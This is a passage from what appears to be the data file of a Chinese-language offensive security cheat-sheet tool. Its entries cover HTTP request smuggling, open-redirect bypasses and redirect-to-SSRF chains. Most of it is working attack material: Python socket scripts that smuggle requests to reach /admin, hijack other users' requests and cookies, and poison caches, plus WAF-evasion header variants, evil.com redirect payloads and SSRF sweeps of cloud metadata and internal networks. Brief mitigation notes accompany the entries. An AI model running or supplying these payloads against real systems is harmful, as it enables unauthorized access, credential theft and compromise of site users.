# - 如果正常返回: 可能只解析了一个CL
# - 如果400/错误: 服务器拒绝多CL(安全)
# - 如果部分处理: 存在走私可能`,
        description: '探测目标是否存在双CL走私条件',
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-H "Content-Length: 6"', explanation: '第一个CL头，前端可能使用这个', type: 'parameter' },
          { part: '-H "Content-Length: 0"', explanation: '第二个CL头，后端可能使用这个', type: 'parameter' },
        ]
      },
      {
        title: 'CL-CL请求走私POC',
        command: `# Python POC - CL-CL走私
import socket

def smuggle_cl_cl(host, port):
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 44\r\n"   # 前端使用这个CL
        "Content-Length: 0\r\n"    # 后端使用这个CL
        "\r\n"
        "GET /admin HTTP/1.1\r\n"  # 走私的请求
        f"Host: {host}\r\n"
        "\r\n"
    )
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    resp = s.recv(4096).decode(errors="ignore")
    print(resp)
    s.close()

smuggle_cl_cl("target.com", 80)`,
        description: '构造包含两个Content-Length的走私请求，将恶意请求注入到后端处理队列',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Content-Length: 44', explanation: '前端代理解析的CL值，包含走私请求的长度', type: 'value' },
          { part: 'Content-Length: 0', explanation: '后端解析的CL值，认为body为空', type: 'value' },
          { part: 'GET /admin', explanation: '走私注入的第二个请求，被后端作为独立请求处理', type: 'value' },
        ]
      },
      {
        title: '利用CL-CL走私绕过前端访问控制',
        command: `# 场景：前端限制/admin访问，通过走私绕过
import socket

def bypass_acl(host, port):
    # 走私请求到/admin端点
    smuggled = (
        "GET /admin HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "\r\n"
    )
    content_length_real = len(smuggled)
    
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: {content_length_real}\r\n"
        "Content-Length: 0\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        + smuggled
    )
    
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    # 接收两个响应
    resp = s.recv(8192).decode(errors="ignore")
    print("[Response 1 - Normal]")
    print(resp[:500])
    resp2 = s.recv(8192).decode(errors="ignore")
    print("[Response 2 - Smuggled /admin]")
    print(resp2[:500])
    s.close()

bypass_acl("target.com", 80)`,
        description: '利用CL-CL走私绕过前端代理的ACL访问限制访问/admin',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Connection: keep-alive', explanation: '保持TCP连接复用，使走私请求能被后端处理', type: 'value' },
          { part: 'recv(8192)', explanation: '接收两个HTTP响应，第二个是走私请求的结果', type: 'command' },
        ]
      },
    ],
    tutorial: {
      overview: 'CL-CL(Content-Length - Content-Length)走私发生在前端和后端对HTTP请求中多个Content-Length头的处理不一致时。RFC 7230规定不应接受包含多个CL的请求，但某些服务器实现选择了其中一个CL。如果前端使用第一个CL，后端使用第二个CL(或反之)，攻击者可以将一个请求的body中注入第二个完整的HTTP请求。',
      vulnerability: '前端代理和后端服务器在接收到包含多个Content-Length头的请求时，选择了不同的CL值。一方使用第一个CL读取请求体，另一方使用第二个CL，导致部分数据被当作下一个请求处理。',
      exploitation: '利用流程：1) 确认前端-后端架构 2) 发送双CL请求检测差异 3) 构造走私payload将恶意请求注入后端队列 4) 利用走私绕过ACL/WAF访问受限资源 5) 可能进一步实现请求劫持/缓存投毒',
      mitigation: '1) RFC合规：拒绝包含多个Content-Length的请求(返回400) 2) 前端和后端统一CL解析逻辑 3) 使用HTTP/2端到端 4) 前端规范化请求后转发 5) 禁用Connection: keep-alive的TCP复用',
      difficulty: 'advanced'
    },
      wafBypass: [
        { 
          title: 'HTTP/2降级绕过', 
          command: `# HTTP/2 -> HTTP/1.1降级利用
# 前端H2后端H1时的走私
:method: POST
:path: /
:authority: target.com
content-length: 0

GET /admin HTTP/1.1
Host: target.com

# H2C升级走私
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: <base64>
Connection: Upgrade, HTTP2-Settings`,
            syntaxBreakdown: [
              { part: '# HTTP/2 -> HTTP/1.1降级利用', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共14行', type: 'value' }
            ],
          description: '利用HTTP/2到HTTP/1.1协议降级时前后端对请求边界解析不一致实现走私' 
        },
        { 
          title: '连接复用操控', 
          command: `# 双CL值差异
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Content-Length: 50

12345GPOST /admin HTTP/1.1
Host: target.com

# 利用keep-alive连接复用
GET / HTTP/1.1
Host: target.com
Connection: keep-alive
Content-Length: 0

GET /admin HTTP/1.1
Host: internal.target.com`,
            syntaxBreakdown: [
              { part: '# 双CL值差异', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共14行', type: 'value' }
            ],
          description: '通过双Content-Length头值差异和keep-alive连接复用在代理链中走私请求' 
        },
        { 
          title: '代理链混淆', 
          command: `# 多级代理CL处理差异
POST / HTTP/1.1
Host: target.com
Content-Length: 44
Content-Length : 0

GET /admin HTTP/1.1
Host: target.com
X: 1

# 空格混淆CL头
POST / HTTP/1.1
Host: target.com
 Content-Length: 0
Content-Length: 42

GET /internal HTTP/1.1
Host: target.com`,
            syntaxBreakdown: [
              { part: '# 多级代理CL处理差异', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共15行', type: 'value' }
            ],
          description: '利用多级代理对Content-Length头中空格和冒号处理差异实现请求走私' 
        }
      ]
    },
  {
    id: 'smuggling-te-cl',
    name: 'TE-CL走私',
    description: '利用前端使用Transfer-Encoding而后端使用Content-Length的差异实现HTTP请求走私',
    category: '请求走私',
    subCategory: 'TE-CL',
    tags: ['smuggling', 'te-cl', 'http'],
    prerequisites: ['前端代理优先处理Transfer-Encoding', '后端服务器优先处理Content-Length', '理解chunked编码格式'],
    execution: [
      {
        title: '检测TE-CL差异',
        command: `# 发送同时包含TE和CL的请求:
curl -v "http://target.com/" \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 3" \
  -d "0\r\n\r\n"

# 使用timing检测:
# 如果后端使用CL，会等待更多数据(超时)
import socket, time

s = socket.socket()
s.connect(("target.com", 80))
payload = (
    "POST / HTTP/1.1\r\n"
    "Host: target.com\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Content-Length: 6\r\n"
    "\r\n"
    "0\r\n\r\n"
)
s.send(payload.encode())
start = time.time()
resp = s.recv(4096)
elapsed = time.time() - start
print(f"Response in {elapsed:.2f}s")
# 快速响应=后端用TE, 延迟响应=后端用CL`,
        description: '检测前端和后端对TE vs CL的优先级差异',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Transfer-Encoding: chunked', explanation: '分块传输编码，前端优先使用', type: 'value' },
          { part: 'Content-Length: 6', explanation: '后端可能使用CL来确定body长度', type: 'value' },
          { part: '0\r\n\r\n', explanation: 'chunked编码的终止块(0长度)', type: 'value' },
        ]
      },
      {
        title: 'TE-CL走私POC',
        command: `import socket

def te_cl_smuggle(host, port):
    # 前端(TE): 读取到"0\r\n\r\n"结束 → 整个payload是一个请求
    # 后端(CL): 只读取Content-Length指定的字节 → 剩余字节是新请求
    
    smuggled = "GET /admin HTTP/1.1\r\nHost: {}\r\n\r\n".format(host)
    
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: {}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "{}\r\n"
        "{}"
        "0\r\n\r\n"
    ).format(host, format(len(smuggled), "x"), smuggled)
    
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    resp = s.recv(4096)
    print(resp.decode(errors="ignore")[:500])
    s.close()

te_cl_smuggle("target.com", 80)`,
        description: 'TE-CL走私：前端按chunked处理转发整个body，后端按CL只读取部分，剩余变为走私请求',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'format(len(smuggled), "x")', explanation: '将走私请求长度转为十六进制(chunked格式)', type: 'command' },
          { part: 'Content-Length: 4', explanation: '后端只读取4字节，剩余数据成为下一个请求', type: 'value' },
        ]
      },
      {
        title: 'TE-CL走私实现请求劫持',
        command: `# 利用走私劫持下一个用户的请求
import socket

def hijack_request(host, port):
    # 走私一个不完整的POST请求
    # 下一个正常用户的请求会被拼接为这个POST的body
    smuggled = (
        "POST /search HTTP/1.1\r\n"
        "Host: {}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 200\r\n"  # 大CL会吞噬下一个请求
        "\r\n"
        "q="  # 下一个请求的数据会被当作搜索参数
    ).format(host)
    
    chunk_size = format(len(smuggled), "x")
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: {}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "{}\r\n"
        "{}"
        "0\r\n\r\n"
    ).format(host, chunk_size, smuggled)
    
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    print(s.recv(4096).decode(errors="ignore")[:500])
    s.close()

hijack_request("target.com", 80)`,
        description: '走私不完整的POST请求，使下一个用户的请求内容(含Cookie)被反射到搜索结果中',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Content-Length: 200', explanation: '故意设置大CL，"吞噬"下一个请求的头部', type: 'value' },
          { part: 'q=', explanation: '下一个用户的请求数据被拼接到搜索参数中', type: 'value' },
        ]
      },
    ],
    tutorial: {
      overview: 'TE-CL走私发生在前端代理优先处理Transfer-Encoding(chunked)而后端服务器优先处理Content-Length时。前端按chunked编码将完整数据转发给后端，但后端只读取CL指定的字节数，多余的数据被留在TCP缓冲区中，被当作下一个独立请求处理。',
      vulnerability: '前端和后端对同时存在的Transfer-Encoding和Content-Length的优先级处理不一致。RFC 7230规定存在TE时应忽略CL，但部分后端实现优先使用CL。',
      exploitation: '利用流程：1) 检测TE vs CL优先级差异 2) 构造同时包含TE和CL的请求 3) 前端按TE转发完整请求 4) 后端按CL截断，剩余数据成为走私请求 5) 走私请求绕过ACL/WAF或劫持其他用户请求',
      mitigation: '1) 统一前后端的TE/CL优先级 2) 拒绝同时包含TE和CL的请求 3) 使用HTTP/2 4) 禁用后端的TCP连接复用 5) 前端在转发前规范化请求',
      difficulty: 'expert'
    },
      wafBypass: [
        { 
          title: 'TE头大小写变体绕过', 
          command: `# TE头大小写混淆
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: identity

5c
GPOST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


# Transfer-Encoding变体
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x`,
            syntaxBreakdown: [
              { part: '# TE头大小写混淆', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共17行', type: 'value' }
            ],
          description: '利用不同代理对Transfer-Encoding头名大小写和值处理的差异绕过TE-CL走私检测' 
        },
        { 
          title: '空白字符注入', 
          command: `# 制表符/换行注入TE头
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding:\\tchunked

# 行前空格混淆
POST / HTTP/1.1
Host: target.com
Content-Length: 4
 Transfer-Encoding: chunked

# CRLF注入变体
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked\\x0d\\x0aX-Ignore: x`,
            syntaxBreakdown: [
              { part: '# 制表符/换行注入TE头', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共15行', type: 'value' }
            ],
          description: '在Transfer-Encoding头中注入制表符、前导空格和CRLF字符，使不同代理解析不同' 
        },
        { 
          title: 'chunk扩展字段利用', 
          command: `# chunk扩展混淆
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5;ext=val
hello
0


# 超长chunk扩展
5;aaaaaaa...aaaa=bbbb...bbb
hello
0


# 非法chunk大小格式
 5
hello
0


# 0x前缀
0x5
hello
0`,
            syntaxBreakdown: [
              { part: '# chunk扩展混淆', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共20行', type: 'value' }
            ],
          description: '利用HTTP分块传输中chunk-extension字段和非标准chunk大小格式造成前后端解析差异' 
        }
      ]
    },
  {
    id: 'smuggling-te-te',
    name: 'TE-TE走私',
    description: '利用前端和后端对Transfer-Encoding头的不同混淆变体的处理差异实现请求走私',
    category: '请求走私',
    subCategory: 'TE-TE',
    tags: ['smuggling', 'te-te', 'http'],
    prerequisites: ['前后端都支持Transfer-Encoding', '可以通过TE头混淆使一端忽略TE', '了解chunked编码和HTTP走私原理'],
    execution: [
      {
        title: 'TE混淆变体探测',
        command: `# Transfer-Encoding的各种混淆写法:
# 测试哪种混淆能让一端忽略TE
import socket

te_variants = [
    "Transfer-Encoding: xchunked",
    "Transfer-Encoding : chunked",     # 冒号前空格
    "Transfer-Encoding: chunked\r\nTransfer-encoding: cow",  # 两个TE
    "Transfer-Encoding\t: chunked",    # Tab分隔
    "Transfer-Encoding: \tchunked",    # Tab前缀
    " Transfer-Encoding: chunked",     # 行首空格
    "X: x\r\nTransfer-Encoding: chunked",  # Header注入
    "Transfer-Encoding: chunked\x00",  # 空字节
]

for i, te in enumerate(te_variants):
    print(f"[{i}] Testing: {te[:60]}")
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: target.com\r\n"
        f"{te}\r\n"
        "Content-Length: 5\r\n"
        "\r\n"
        "0\r\n\r\n"
    )
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect(("target.com", 80))
        s.send(payload.encode())
        resp = s.recv(1024).decode(errors="ignore")
        status = resp.split("\r\n")[0] if resp else "No response"
        print(f"    → {status}")
        s.close()
    except Exception as e:
        print(f"    → Error: {e}")`,
        description: '测试各种Transfer-Encoding混淆变体，寻找前后端解析差异',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Transfer-Encoding: xchunked', explanation: '无效TE值，某些服务器可能忽略', type: 'value' },
          { part: 'Transfer-Encoding : chunked', explanation: '冒号前加空格，可能导致解析差异', type: 'value' },
          { part: 'Transfer-encoding: cow', explanation: '第二个TE头覆盖为无效值', type: 'value' },
        ]
      },
      {
        title: 'TE-TE走私利用(前端忽略混淆TE)',
        command: `import socket

def te_te_smuggle(host, port, te_header):
    # 前端不识别混淆的TE → 使用CL
    # 后端识别混淆的TE → 使用chunked
    
    smuggled = "GET /admin HTTP/1.1\r\nHost: {}\r\n\r\n".format(host)
    
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: {}\r\n"
        "Content-Length: {}\r\n"
        "{}\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "{}"
    ).format(
        host,
        len("0\r\n\r\n" + smuggled),
        te_header,
        smuggled
    )
    
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    resp = s.recv(4096)
    print(resp.decode(errors="ignore")[:500])
    s.close()

# 使用发现的有效混淆变体:
te_te_smuggle("target.com", 80, "Transfer-Encoding: chunked\r\nTransfer-encoding: cow")`,
        description: '利用TE头混淆使一端按CL、另一端按TE处理，实现走私',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Transfer-encoding: cow', explanation: '混淆TE值，使一端降级为使用CL', type: 'value' },
        ]
      },
      {
        title: 'TE-TE缓存投毒攻击',
        command: `import socket

def cache_poison_via_smuggling(host, port):
    # 通过走私实现缓存投毒:
    # 走私的请求指向静态资源，但包含恶意响应头/内容
    
    smuggled = (
        "GET /static/main.js HTTP/1.1\r\n"
        "Host: {}\r\n"
        "\r\n"
    ).format(host)
    
    # 先发送走私请求
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: {}\r\n"
        "Content-Length: {}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Transfer-encoding: x\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "{}"
    ).format(host, len("0\r\n\r\n" + smuggled), smuggled)
    
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    resp = s.recv(4096)
    print("[*] Cache poisoned")
    print(resp.decode(errors="ignore")[:300])
    s.close()

cache_poison_via_smuggling("target.com", 80)`,
        description: '利用TE-TE走私实现Web缓存投毒攻击',
        platform: 'all',
        syntaxBreakdown: [
          { part: '/static/main.js', explanation: '目标静态资源URL，投毒后影响所有访问者', type: 'value' },
          { part: 'Transfer-encoding: x', explanation: '无效TE值混淆，使前端降级到CL解析', type: 'value' },
        ]
      },
    ],
    tutorial: {
      overview: 'TE-TE走私发生在前端和后端都支持Transfer-Encoding但对其混淆变体的处理不同时。攻击者通过修改TE头的格式(大小写混合、特殊字符、多个TE头等)，使一端识别TE(按chunked处理)而另一端不识别(降级为CL处理)，从而产生解析差异实现走私。',
      vulnerability: '服务器对Transfer-Encoding头的非标准格式处理不一致：一方严格匹配"chunked"关键字(混淆后不识别)，另一方宽松解析(混淆后仍识别)。',
      exploitation: '利用流程：1) 枚举各种TE混淆变体 2) 找到使前后端解析不一致的变体 3) 构造走私payload 4) 利用走私绕过安全控制或劫持请求/投毒缓存',
      mitigation: '1) 严格规范化TE头处理 2) 拒绝非标准格式的TE头 3) 前后端统一HTTP解析逻辑 4) 使用HTTP/2消除走私风险 5) 部署请求走私检测规则',
      difficulty: 'expert'
    },
      wafBypass: [
        { 
          title: '多重TE头混淆', 
          command: `# 多个Transfer-Encoding头
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding: chunked

# 逗号分隔多值
Transfer-Encoding: chunked, identity
Transfer-Encoding: identity, chunked

# 混合有效无效值
Transfer-Encoding: chunked
Transfer-Encoding: cow
Transfer-Encoding: chunked`,
            syntaxBreakdown: [
              { part: '# 多个Transfer-Encoding头', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共13行', type: 'value' }
            ],
          description: '发送多个Transfer-Encoding头或逗号分隔多值，利用前后端对多值TE头的优先级差异' 
        },
        { 
          title: '非标准TE值混淆', 
          command: `# 垃圾TE值使某些代理忽略TE
Transfer-Encoding: xchunked
Transfer-Encoding: chunked-false
Transfer-Encoding: chunk
Transfer-Encoding: CHUNKED

# 引号包裹
Transfer-Encoding: "chunked"

# 参数附加
Transfer-Encoding: chunked; q=0.5
Transfer-Encoding: chunked, x

# 编码混淆
Transfer-\\x45ncoding: chunked`,
            syntaxBreakdown: [
              { part: '# 垃圾TE值使某些代理忽略TE', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共12行', type: 'value' }
            ],
          description: '使用非标准或被篡改的Transfer-Encoding值，使前端代理回退到CL而后端仍解析为chunked' 
        },
        { 
          title: '代理特定解析绕过', 
          command: `# HAProxy特定绕过
POST / HTTP/1.1
Host: target.com
Transfer-Encoding:[\\x0b]chunked

# Apache特定绕过
POST / HTTP/1.1
Host: target.com
Transfer-Encoding:\\x00chunked

# Nginx特定绕过
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked\\x20

# 通用尾部空白
Transfer-Encoding: chunked `,
            syntaxBreakdown: [
              { part: '# HAProxy特定绕过', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共14行', type: 'value' }
            ],
          description: '针对特定代理/服务器（HAProxy/Apache/Nginx）的TE头解析特性发送定制化走私payload' 
        }
      ]
    },
  {
    id: 'redirect-bypass',
    name: '重定向绕过',
    description: '开放重定向绕过技巧',
    category: '开放重定向',
    subCategory: 'Bypass',
    tags: ['redirect', 'bypass'],
    prerequisites: ['存在重定向参数'],
    execution: [
      { 
        title: 'URL编码', 
        command: 'redirect=http%3a%2f%2fattacker.com', 
        description: '使用URL编码', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '%3a', explanation: '冒号:', type: 'char' }
        ]
      },
      { 
        title: '@符号', 
        command: 'redirect=http://target.com@attacker.com', 
        description: '利用URL认证部分', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '@', explanation: '分隔用户信息和主机', type: 'char' }
        ]
      },
      { 
        title: '反斜杠', 
        command: 'redirect=https:/\attacker.com', 
        description: '使用反斜杠', 
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'redirect', explanation: '关键参数', type: 'value' },
          { part: 'https:/\attacker.com', explanation: '关键参数', type: 'value' }
        ]
      }
    ],
    tutorial: {
      overview: '开发者常通过正则或黑名单限制重定向，可被多种技巧绕过。',
      vulnerability: '校验逻辑不严。',
      exploitation: '使用编码、特殊字符、IP格式绕过',
      mitigation: '白名单校验域名',
      difficulty: 'intermediate'
    },
    wafBypass: [
        { 
          title: '反斜杠路径规范化', 
          command: `# 反斜杠替代正斜杠
https://target.com/redirect?url=https://evil.com\\@target.com
https://target.com/redirect?url=https:\\\\evil.com

# 路径穿越绕过域名白名单
https://target.com/redirect?url=https://target.com/..%2f@evil.com
https://target.com/redirect?url=//evil.com/%2f..%2f

# 协议相对URL
https://target.com/redirect?url=//evil.com
https://target.com/redirect?url=\\\\evil.com`,
            syntaxBreakdown: [
              { part: '# 反斜杠替代正斜杠', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共9行', type: 'value' }
            ],
          description: '利用反斜杠在不同浏览器/服务器中的路径规范化差异绕过重定向域名白名单' 
        },
        { 
          title: 'URL片段与参数注入', 
          command: `# 片段标识符混淆
https://target.com/redirect?url=https://target.com#@evil.com
https://target.com/redirect?url=https://target.com%23@evil.com

# 参数污染
https://target.com/redirect?url=https://target.com&url=https://evil.com
https://target.com/redirect?url=https://target.com%26next=evil.com

# 编码混淆
https://target.com/redirect?url=https%3a%2f%2fevil.com
https://target.com/redirect?url=%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d`,
            syntaxBreakdown: [
              { part: '# 片段标识符混淆', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共9行', type: 'value' }
            ],
          description: '利用URL片段标识符、参数污染和完整URL编码绕过服务端的重定向目标检查' 
        },
        { 
          title: '空字节与特殊字符截断', 
          command: `# 空字节截断
https://target.com/redirect?url=https://target.com%00@evil.com
https://target.com/redirect?url=https://evil.com%00.target.com

# 换行符注入
https://target.com/redirect?url=https://evil.com%0d%0aLocation:%20https://evil.com

# Tab/空格混淆
https://target.com/redirect?url=https://evil .com
https://target.com/redirect?url=java%09script:alert(1)
https://target.com/redirect?url=\\x09javascript:alert(1)`,
            syntaxBreakdown: [
              { part: '# 空字节截断\nhttps://target.com/redirect?url=https://target.com%00@evil.com\nhttps://target.com/redirect?url=https://evil.com%00.target.com\n\n# 换行符注入\nhttps://target.com/redirect?url=https://evil.com%0d%0aLocation:%20https://evil.com\n\n# Tab/空格混淆\nhttps://target.com/redirect?url=https://evil .com\nhttps://target.com/redirect?url=java%09script:alert(1)\nhttps://target.com/redirect?url=\\x09javascript:alert(1)', explanation: '注入代码', type: 'value' }
            ],
          description: '利用空字节截断URL校验、CRLF注入额外头部、特殊空白字符混淆URL解析' 
        }
      ]
    },
  {
    id: 'redirect-ssrf',
    name: '重定向到SSRF',
    description: '利用开放重定向漏洞作为跳板将SSRF探测引导到内部网络，绕过SSRF的URL白名单/黑名单限制',
    category: '开放重定向',
    subCategory: 'SSRF',
    tags: ['redirect', 'ssrf'],
    prerequisites: ['目标存在开放重定向(Open Redirect)漏洞', '目标存在SSRF功能点(URL参数/Webhook等)', 'SSRF过滤仅检查初始URL而不跟踪重定向'],
    execution: [
      {
        title: '识别开放重定向点',
        command: `# 常见重定向参数:
curl -sI "http://target.com/redirect?url=https://evil.com" | grep -i location
curl -sI "http://target.com/login?next=https://evil.com" | grep -i location
curl -sI "http://target.com/goto?link=https://evil.com" | grep -i location

# 批量测试常见参数:
for param in url redirect next goto link return returnUrl callback dest destination rurl; do
  status=$(curl -sI "http://target.com/redirect?\${param}=https://evil.com" -o /dev/null -w "%{http_code}")
  location=$(curl -sI "http://target.com/redirect?\${param}=https://evil.com" | grep -i "^location:" | head -1)
  echo "\${param}: HTTP \${status} → \${location}"
done`,
        description: '寻找目标站点的开放重定向端点和参数',
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'grep -i location', explanation: '检查重定向的Location响应头', type: 'command' },
          { part: 'redirect,next,goto,link', explanation: '常见的重定向参数名称', type: 'value' },
        ]
      },
      {
        title: '通过重定向绕过SSRF过滤',
        command: `# 场景: SSRF接口检查URL域名白名单，但不检查重定向目标

# 正常SSRF请求(被拦截):
curl "http://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"
# → 返回: "Blocked: internal IP"

# 通过重定向绕过:
# 1. 先确认重定向有效:
curl -sI "http://target.com/redirect?url=http://169.254.169.254/latest/meta-data/"

# 2. 将重定向URL作为SSRF输入:
curl "http://target.com/api/fetch?url=http://target.com/redirect?url=http://169.254.169.254/latest/meta-data/"
# → SSRF过滤看到target.com(白名单内)，放行
# → 服务端跟随重定向到169.254.169.254
# → 返回AWS元数据`,
        description: '利用目标自身的重定向端点绕过SSRF的域名白名单限制',
        platform: 'linux',
        syntaxBreakdown: [
          { part: '169.254.169.254', explanation: 'AWS元数据服务地址(SSRF常用目标)', type: 'value' },
          { part: 'http://target.com/redirect?url=', explanation: '利用自身域名的重定向作为SSRF跳板', type: 'value' },
        ]
      },
      {
        title: '短链接和DNS重绑定辅助',
        command: `# 如果目标站点没有开放重定向，使用外部服务:

# 1. 短链接服务重定向:
# 创建短链接指向内部IP: bit.ly/xxxxx → http://192.168.1.1
curl "http://target.com/api/fetch?url=https://bit.ly/xxxxx"

# 2. 自建重定向服务器:
# Python Flask:
# @app.route("/redirect")
# def redir():
#     return redirect("http://169.254.169.254/latest/meta-data/")
curl "http://target.com/api/fetch?url=http://attacker.com/redirect"

# 3. DNS重绑定:
# 使用rbndr.us等工具，DNS记录在attacker-IP和内部IP之间切换
# 第一次解析: attacker.com → 1.2.3.4 (通过IP检查)
# 第二次解析: attacker.com → 169.254.169.254 (实际请求)
curl "http://target.com/api/fetch?url=http://a]c0a80101.rbndr.us/"`,
        description: '使用短链接、自建重定向和DNS重绑定辅助SSRF绕过',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'bit.ly/xxxxx', explanation: '短链接服务自动执行302重定向', type: 'value' },
          { part: 'rbndr.us', explanation: 'DNS重绑定服务，交替解析到不同IP', type: 'value' },
          { part: 'DNS重绑定', explanation: '在IP验证和实际请求之间切换DNS解析结果', type: 'value' },
        ]
      },
      {
        title: '完整利用链: 重定向→SSRF→内网探测',
        command: `# 完整攻击链:
import requests

TARGET = "http://target.com"
SSRF_URL = f"{TARGET}/api/fetch?url="
REDIR_URL = f"{TARGET}/redirect?url="

# 通过重定向探测内网:
internal_targets = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:8080/",
    "http://192.168.1.1/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",
]

for internal in internal_targets:
    # 构造: SSRF → 重定向 → 内网目标
    payload = f"{SSRF_URL}{REDIR_URL}{internal}"
    try:
        r = requests.get(payload, timeout=5)
        if r.status_code == 200 and len(r.text) > 0:
            print(f"[+] FOUND: {internal}")
            print(f"    Response: {r.text[:200]}")
        else:
            print(f"[-] {internal}: HTTP {r.status_code}")
    except Exception as e:
        print(f"[!] {internal}: {e}")`,
        description: '利用重定向→SSRF链批量探测内部网络资源',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'SSRF_URL + REDIR_URL + internal', explanation: '三层链式利用：SSRF接口→重定向→内网', type: 'value' },
          { part: 'timeout=5', explanation: '设置超时避免内网不可达时长时间等待', type: 'parameter' },
        ]
      },
    ],
    tutorial: {
      overview: '重定向+SSRF组合攻击是一种高级SSRF绕过技术。当SSRF过滤仅检查初始URL的域名/IP(白名单)但服务端HTTP客户端会跟随302重定向时，攻击者可以利用目标自身的开放重定向端点作为跳板，将请求从白名单域名重定向到内网IP地址。',
      vulnerability: '1) 目标存在开放重定向漏洞(未验证重定向目标) 2) SSRF功能的URL过滤仅检查初始请求的域名/IP 3) 服务端HTTP客户端自动跟随302/301重定向 4) 重定向后的请求不再经过URL过滤',
      exploitation: '利用流程：1) 找到开放重定向端点 2) 确认SSRF功能点 3) 构造重定向URL指向内网目标 4) 将重定向URL作为SSRF输入 5) 通过重定向绕过白名单访问内网',
      mitigation: '1) 修复所有开放重定向漏洞 2) SSRF过滤应在HTTP请求的每一跳进行 3) 禁用HTTP客户端的自动重定向跟随 4) 白名单+黑名单双重过滤 5) 网络层隔离SSRF功能所在的服务器',
      difficulty: 'intermediate'
    },
      wafBypass: [
        { 
          title: 'URL解析差异利用', 
          command: `# 利用URL解析库差异
http://evil.com#@target.com
http://evil.com\\@target.com
http://target.com@evil.com

# 特殊URL格式
http://evil。com (全角句号)
http://ⓔⓥⓘⓛ.com (Unicode圆圈字符)
http://evil%E3%80%82com

# IPv6地址混淆
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]`,
            syntaxBreakdown: [
              { part: '# 利用URL解析库差异', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共11行', type: 'value' }
            ],
          description: '利用不同URL解析库（cURL/urllib/Java URL）对authority/host部分解析的差异绕过SSRF白名单' 
        },
        { 
          title: 'DNS重绑定攻击', 
          command: `# DNS Rebinding攻击步骤
# 1. 配置DNS服务器交替返回不同IP
# evil.com -> 第1次解析: 公网IP（通过校验）
# evil.com -> 第2次解析: 127.0.0.1（实际请求）

# 使用rbndr.us自动DNS重绑定
http://7f000001.c0a80001.rbndr.us/internal

# 使用1u.ms
http://make-127.0.0.1-rr.1u.ms/admin

# TOCTOU: 检查时域名解析到白名单IP，请求时解析到内网IP`,
            syntaxBreakdown: [
              { part: '# DNS Rebinding攻击步骤', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共9行', type: 'value' }
            ],
          description: '通过DNS重绑定在URL校验和实际请求之间切换解析结果，绕过SSRF的IP黑名单' 
        },
        { 
          title: 'IP地址混淆表示', 
          command: `# 十进制IP
http://2130706433  (= 127.0.0.1)
